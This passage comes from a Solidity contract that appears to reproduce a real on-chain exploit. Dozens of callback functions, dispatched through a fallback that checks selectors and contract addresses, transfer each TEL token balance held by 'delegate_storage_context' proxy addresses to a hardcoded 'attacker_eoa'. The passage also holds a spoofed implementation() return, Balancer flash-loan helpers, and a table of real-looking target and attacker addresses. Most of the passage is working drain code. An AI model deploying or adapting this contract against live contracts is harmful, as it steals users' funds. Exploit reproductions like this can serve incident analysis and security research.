
    function _callback39() internal {
        _markCallback(39);
        uint256 telBalanceOfDelegateStorageContextD6b7 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_D6B7);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextD6b7);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_D6B7);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback40() internal {
        _markCallback(40);
        uint256 telBalanceOfDelegateStorageContext0b63 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_0B63);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext0b63);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_0B63);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback41() internal {
        _markCallback(41);
        uint256 telBalanceOfDelegateStorageContext7017 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_7017);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext7017);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_7017);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback42() internal {
        _markCallback(42);
        uint256 telBalanceOfDelegateStorageContextFd48 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_FD48);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextFd48);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_FD48);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback43() internal {
        _markCallback(43);
        uint256 telBalanceOfDelegateStorageContextB10b =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_B10B);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextB10b);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_B10B);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback44() internal {
        _markCallback(44);
        uint256 telBalanceOfDelegateStorageContext18c3 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_18C3);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext18c3);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_18C3);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback45() internal {
        _markCallback(45);
        uint256 telBalanceOfDelegateStorageContextF9ac =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_F9AC);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextF9ac);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_F9AC);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback46() internal {
        _markCallback(46);
        uint256 telBalanceOfDelegateStorageContext3fd3 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_3FD3);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext3fd3);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_3FD3);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback47() internal {
        _markCallback(47);
        uint256 telBalanceOfDelegateStorageContext5d22 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_5D22);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext5d22);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_5D22);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback48() internal {
        _markCallback(48);
        uint256 telBalanceOfDelegateStorageContext8b3b =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_8B3B);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext8b3b);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_8B3B);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback49() internal {
        _markCallback(49);
        uint256 telBalanceOfDelegateStorageContextCf87 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_CF87);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextCf87);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_CF87);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback50() internal {
        _markCallback(50);
        uint256 telBalanceOfDelegateStorageContext9b05 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_9B05);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext9b05);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_9B05);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    receive() external payable {}

    function implementation() external payable {
        bytes memory ret = hex"00000000000000000000000010e5c8d3537856f141272e1c39befdab4dd8bde0";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.sig == 0x3bb145b1) {
            _attack();
            return;
        }
        if (msg.sig == 0xa8b89898) {
            if (address(this) == 0x56BCADff30680EBB540a84D75c182A5dC61981C0) {
                _callback18();
                return;
            }
            if (address(this) == 0x4C850754aC8D66498a5063e6d602A38E936bD505) {
                _callback14();
                return;
            }
            if (address(this) == 0x0C5E0902DAA4D1a954ee1339C66BF259C78A5500) {
                _callback2();
                return;
            }
            if (address(this) == 0x60fD26E36994DA4951ac49DA81122B72a896F024) {
                _callback22();
                return;
            }
            if (address(this) == 0x17b048E834D42FABe586dF4Ac4b804Dc22b34087) {
                _callback6();
                return;
            }
            if (address(this) == 0xdBDaaAB41448c7b8A84cF4071B4a771d053e5D22) {
                _callback47();
                return;
            }
            if (address(this) == 0x2e48306F89d0848f758303Db3A8763d89292d3CE) {
                _callback11();
                return;
            }
            if (address(this) == 0xAe523A9C2A7AF393e6387364931848cF7eA20b63) {
                _callback40();
                return;
            }
            if (address(this) == 0xac87B68254736690b9F12A8379ba2387F447D6B7) {
                _callback39();
                return;
            }
            if (address(this) == 0x00eC6875426249050626E332234458aB8CFA4554) {
                _callback();
                return;
            }
            if (address(this) == 0x4108897b6A0f54F1D8BD8E00782dda6D6c78d1aB) {
                _callback13();
                return;
            }
            if (address(this) == 0x7d09ebEb47aaCE89A50bB66b7cC5939d846200aa) {
                _callback27();
                return;
            }
            if (address(this) == 0xF44C3d146D904F90D96a344430C388C252BB9b05) {
                _callback50();
                return;
            }
            if (address(this) == 0x61647fF79aE8d1C444690DB9e81C6929B31B5596) {
                _callback23();
                return;
            }
            if (address(this) == 0x75097604A46bCC1237AF78F864c9EfB674347879) {
                _callback25();
                return;
            }
            if (address(this) == 0x5716Eceb4bCd3e3721C4Eb9d261Fb66dE1E23ADd) {
                _callback19();
                return;
            }
            if (address(this) == 0xD2FA0CF181405F30bFD9E81f0eF16b853e33f9ac) {
                _callback45();
                return;
            }
            if (address(this) == 0x86A027F342803f6B3DB7d7b5D11C7F79D3284ebC) {
                _callback30();
                return;
            }
            if (address(this) == 0x19c0DB445d47F188E7a240aF97c3fCD860954c4D) {
                _callback7();
                return;
            }
            if (address(this) == 0xc62A32C7D6a204Df889E7D073C9A4AE837B6fd48) {
                _callback42();
                return;
            }
            if (address(this) == 0x250742d8300a5178B7704004D2225CD7e307D5c8) {
                _callback10();
                return;
            }
            if (address(this) == 0xe0ac9CF649AD0f68F1b95de7FE4553aFf7978b3B) {
                _callback48();
                return;
            }
            if (address(this) == 0x12681610b7d7D15F86d79041c356fd8b3fdCDf0E) {
                _callback5();
                return;
            }
            if (address(this) == 0x0d561A273220fA343Feda6f5d07518f12E2e3c26) {
                _callback3();
                return;
            }
            if (address(this) == 0xD0E10ac87C48606320236ceA0c46dCc4EF1418C3) {
                _callback44();
                return;
            }
            if (address(this) == 0xa6E803dCCF90e5dd8791974fDba36c03214bbCB6) {
                _callback38();
                return;
            }
            if (address(this) == 0xC656169c38Cbc224FF53D9c01e58Df2661f1B10b) {
                _callback43();
                return;
            }
            if (address(this) == 0x5e2a6f73a085e85BC7e175D42EF11B266678145C) {
                _callback21();
                return;
            }
            if (address(this) == 0xa093115B97d1B9850914B31C0f112C038575d53A) {
                _callback36();
                return;
            }
            if (address(this) == 0x91E0fF1734425d1CF9068bbD031e9Ebbd38e63c0) {
                _callback33();
                return;
            }
            if (address(this) == 0x552dBD04a58BF37aBbFd7b0473ceD7abDEbe1dAd) {
                _callback17();
                return;
            }
            if (address(this) == 0x243eCe9001ac157948BaAfF93bE0c30Ba0F4A76d) {
                _callback9();
                return;
            }
            if (address(this) == 0xd56dF51Ba7F6EF77eDA08108bf6c6680b4ef3fd3) {
                _callback46();
                return;
            }
            if (address(this) == 0x4e2a34226B1b386af53Ee0755410B07BB0aCd828) {
                _callback15();
                return;
            }
            if (address(this) == 0x890cAcE699D6c78A474661F81bCB8876fBE07b20) {
                _callback31();
                return;
            }
            if (address(this) == 0x1Bd5e4BC8BEa0BBAb940971Dd9DDc1821dFDc892) {
                _callback8();
                return;
            }
            if (address(this) == 0xB12150c0D9e5F48048Df85b6494540c668657017) {
                _callback41();
                return;
            }
            if (address(this) == 0x7c6B23efb51B232da2bf8875883F51D76585b518) {
                _callback26();
                return;
            }
            if (address(this) == 0x51a268bd4C4E9240578e500cb643d5757400Fb5A) {
                _callback16();
                return;
            }
            if (address(this) == 0x8e09Ad317aD37923C6eB43735745800fD6C0411D) {
                _callback32();
                return;
            }
            if (address(this) == 0x808fbb64A72551516d1AFAc0E330cbeA635009Ef) {
                _callback28();
                return;
            }
            if (address(this) == 0xedE15f6CD8B9C28cA6380fd793bd3AEFb249cF87) {
                _callback49();
                return;
            }
            if (address(this) == 0x9DD2A8f90B9249bDad826a6ceDE0e9EF4E018b3e) {
                _callback35();
                return;
            }
            if (address(this) == 0x5dd173E398e401B6ed8791445CF632D8C98957E3) {
                _callback20();
                return;
            }
            if (address(this) == 0x62EE30EDf609278734De4e710f21bB07A907D610) {
                _callback24();
                return;
            }
            if (address(this) == 0x8127c5163820D02DB40deb789c0b5c4c296e8cDd) {
                _callback29();
                return;
            }
            if (address(this) == 0x965b86b964A0a84Bc02EbE13424233Bc9aaED1fa) {
                _callback34();
                return;
            }
            if (address(this) == 0x3B88B88fB9e73cbBA066dbFCDE5FcaBE029c10D6) {
                _callback12();
                return;
            }
            if (address(this) == 0xA5C32e35Dc2c51bCc4AA5EA50Af132F47b41C649) {
                _callback37();
                return;
            }
            _callback18();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function callback() external payable {
        _callback();
    }

    function callback10() external payable {
        _callback10();
    }

    function callback11() external payable {
        _callback11();
    }

    function callback12() external payable {
        _callback12();
    }

    function callback13() external payable {
        _callback13();
    }

    function callback14() external payable {
        _callback14();
    }

    function callback15() external payable {
        _callback15();
    }

    function callback16() external payable {
        _callback16();
    }

    function callback17() external payable {
        _callback17();
    }

    function callback18() external payable {
        _callback18();
    }

    function callback19() external payable {
        _callback19();
    }

    function callback2() external payable {
        _callback2();
    }

    function callback20() external payable {
        _callback20();
    }

    function callback21() external payable {
        _callback21();
    }

    function callback22() external payable {
        _callback22();
    }

    function callback23() external payable {
        _callback23();
    }

    function callback24() external payable {
        _callback24();
    }

    function callback25() external payable {
        _callback25();
    }

    function callback26() external payable {
        _callback26();
    }

    function callback27() external payable {
        _callback27();
    }

    function callback28() external payable {
        _callback28();
    }

    function callback29() external payable {
        _callback29();
    }

    function callback3() external payable {
        _callback3();
    }

    function callback30() external payable {
        _callback30();
    }

    function callback31() external payable {
        _callback31();
    }

    function callback32() external payable {
        _callback32();
    }

    function callback33() external payable {
        _callback33();
    }

    function callback34() external payable {
        _callback34();
    }

    function callback35() external payable {
        _callback35();
    }

    function callback36() external payable {
        _callback36();
    }

    function callback37() external payable {
        _callback37();
    }

    function callback38() external payable {
        _callback38();
    }

    function callback39() external payable {
        _callback39();
    }

    function callback40() external payable {
        _callback40();
    }

    function callback41() external payable {
        _callback41();
    }

    function callback42() external payable {
        _callback42();
    }

    function callback43() external payable {
        _callback43();
    }

    function callback44() external payable {
        _callback44();
    }

    function callback45() external payable {
        _callback45();
    }

    function callback46() external payable {
        _callback46();
    }

    function callback47() external payable {
        _callback47();
    }

    function callback48() external payable {
        _callback48();
    }

    function callback49() external payable {
        _callback49();
    }

    function callback5() external payable {
        _callback5();
    }

    function callback50() external payable {
        _callback50();
    }

    function callback6() external payable {
        _callback6();
    }

    function callback7() external payable {
        _callback7();
    }

    function callback8() external payable {
        _callback8();
    }

    function callback9() external payable {
        _callback9();
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct ReplayCall {
    address target;
    bytes data;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant delegate_storage_context = 0x00eC6875426249050626E332234458aB8CFA4554;
    address internal constant delegate_storage_context_5500 = 0x0C5E0902DAA4D1a954ee1339C66BF259C78A5500;
    address internal constant delegate_storage_context_3C26 = 0x0d561A273220fA343Feda6f5d07518f12E2e3c26;
    address internal constant attack_contract = 0x10E5C8d3537856F141272E1C39BeFdab4Dd8BdE0;
    address internal constant delegate_storage_context_DF0E = 0x12681610b7d7D15F86d79041c356fd8b3fdCDf0E;
    address internal constant delegate_storage_context_4087 = 0x17b048E834D42FABe586dF4Ac4b804Dc22b34087;
    address internal constant A_191C6C_3734 = 0x191C6CA4429860C9D029230C4D7538CD7D643734;
    address internal constant delegate_storage_context_4C4D = 0x19c0DB445d47F188E7a240aF97c3fCD860954c4D;
    address internal constant delegate_storage_context_C892 = 0x1Bd5e4BC8BEa0BBAb940971Dd9DDc1821dFDc892;
    address internal constant delegate_storage_context_A76D = 0x243eCe9001ac157948BaAfF93bE0c30Ba0F4A76d;
    address internal constant delegate_storage_context_D5C8 = 0x250742d8300a5178B7704004D2225CD7e307D5c8;
    address internal constant delegate_storage_context_D3CE = 0x2e48306F89d0848f758303Db3A8763d89292d3CE;
    address internal constant delegate_storage_context_10D6 = 0x3B88B88fB9e73cbBA066dbFCDE5FcaBE029c10D6;
    address internal constant delegate_storage_context_D1AB = 0x4108897b6A0f54F1D8BD8E00782dda6D6c78d1aB;
    address internal constant delegate_storage_context_D505 = 0x4C850754aC8D66498a5063e6d602A38E936bD505;
    address internal constant delegate_storage_context_D828 = 0x4e2a34226B1b386af53Ee0755410B07BB0aCd828;
    address internal constant delegate_storage_context_FB5A = 0x51a268bd4C4E9240578e500cb643d5757400Fb5A;
    address internal constant LINK = 0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39;
    address internal constant delegate_storage_context_1DAD = 0x552dBD04a58BF37aBbFd7b0473ceD7abDEbe1dAd;
    address internal constant delegate_storage_context_81C0 = 0x56BCADff30680EBB540a84D75c182A5dC61981C0;
    address internal constant delegate_storage_context_3ADD = 0x5716Eceb4bCd3e3721C4Eb9d261Fb66dE1E23ADd;
    address internal constant delegate_storage_context_57E3 = 0x5dd173E398e401B6ed8791445CF632D8C98957E3;
    address internal constant delegate_storage_context_145C = 0x5e2a6f73a085e85BC7e175D42EF11B266678145C;
    address internal constant delegate_storage_context_F024 = 0x60fD26E36994DA4951ac49DA81122B72a896F024;
    address internal constant delegate_storage_context_5596 = 0x61647fF79aE8d1C444690DB9e81C6929B31B5596;
    address internal constant delegate_storage_context_D610 = 0x62EE30EDf609278734De4e710f21bB07A907D610;
    address internal constant delegate_storage_context_7879 = 0x75097604A46bCC1237AF78F864c9EfB674347879;
    address internal constant delegate_storage_context_B518 = 0x7c6B23efb51B232da2bf8875883F51D76585b518;
    address internal constant delegate_storage_context_00AA = 0x7d09ebEb47aaCE89A50bB66b7cC5939d846200aa;
    address internal constant A_805B70_13EA = 0x805b70339183f9A98cC7fcB35fCbeb5Ac10713EA;
    address internal constant delegate_storage_context_09EF = 0x808fbb64A72551516d1AFAc0E330cbeA635009Ef;
    address internal constant delegate_storage_context_8CDD = 0x8127c5163820D02DB40deb789c0b5c4c296e8cDd;
    address internal constant delegate_storage_context_4EBC = 0x86A027F342803f6B3DB7d7b5D11C7F79D3284ebC;
    address internal constant delegate_storage_context_7B20 = 0x890cAcE699D6c78A474661F81bCB8876fBE07b20;
    address internal constant delegate_storage_context_411D = 0x8e09Ad317aD37923C6eB43735745800fD6C0411D;
    address internal constant delegate_storage_context_63C0 = 0x91E0fF1734425d1CF9068bbD031e9Ebbd38e63c0;
    address internal constant delegate_storage_context_D1FA = 0x965b86b964A0a84Bc02EbE13424233Bc9aaED1fa;
    address internal constant delegate_storage_context_8B3E = 0x9DD2A8f90B9249bDad826a6ceDE0e9EF4E018b3e;
    address internal constant delegate_storage_context_D53A = 0xa093115B97d1B9850914B31C0f112C038575d53A;
    address internal constant delegate_storage_context_C649 = 0xA5C32e35Dc2c51bCc4AA5EA50Af132F47b41C649;
    address internal constant delegate_storage_context_BCB6 = 0xa6E803dCCF90e5dd8791974fDba36c03214bbCB6;
    address internal constant delegate_storage_context_D6B7 = 0xac87B68254736690b9F12A8379ba2387F447D6B7;
    address internal constant delegate_storage_context_0B63 = 0xAe523A9C2A7AF393e6387364931848cF7eA20b63;
    address internal constant delegate_storage_context_7017 = 0xB12150c0D9e5F48048Df85b6494540c668657017;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant delegate_storage_context_FD48 = 0xc62A32C7D6a204Df889E7D073C9A4AE837B6fd48;
    address internal constant delegate_storage_context_B10B = 0xC656169c38Cbc224FF53D9c01e58Df2661f1B10b;
    address internal constant delegate_storage_context_18C3 = 0xD0E10ac87C48606320236ceA0c46dCc4EF1418C3;
    address internal constant delegate_storage_context_F9AC = 0xD2FA0CF181405F30bFD9E81f0eF16b853e33f9ac;
    address internal constant delegate_storage_context_3FD3 = 0xd56dF51Ba7F6EF77eDA08108bf6c6680b4ef3fd3;
    address internal constant attacker_eoa = 0xDB4B84F0E601e40a02B54497F26E03EF33f3A5b7;
    address internal constant delegate_storage_context_5D22 = 0xdBDaaAB41448c7b8A84cF4071B4a771d053e5D22;
    address internal constant TEL = 0xdF7837DE1F2Fa4631D716CF2502f8b230F1dcc32;
    address internal constant delegate_storage_context_8B3B = 0xe0ac9CF649AD0f68F1b95de7FE4553aFf7978b3B;
    address internal constant delegate_storage_context_CF87 = 0xedE15f6CD8B9C28cA6380fd793bd3AEFb249cF87;
    address internal constant delegate_storage_context_9B05 = 0xF44C3d146D904F90D96a344430C388C252BB9b05;
}

interface IContract_191C6C_3734 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_00AA {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_09EF {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_0B63 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_10D6 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_145C {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_18C3 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_1DAD {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_3ADD {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_3C26 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_3FD3 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_4087 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_411D {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_4C4D {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_4EBC {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_5500 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_5596 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_57E3 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_5D22 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_63C0 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_7017 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_7879 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_7B20 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_81C0 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_8B3B {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_8B3E {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_8CDD {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_9B05 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_A76D {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_B10B {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_B518 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_BCB6 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_C649 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_C892 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_CF87 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_D1AB {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_D1FA {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_D3CE {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_D505 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_D53A {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_D5C8 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_D610 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_D6B7 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_D828 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_DF0E {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_F024 {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_F9AC {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_FB5A {
    function initialize(address, bytes calldata) external;
}

interface Idelegate_storage_context_FD48 {
    function initialize(address, bytes calldata) external;
}
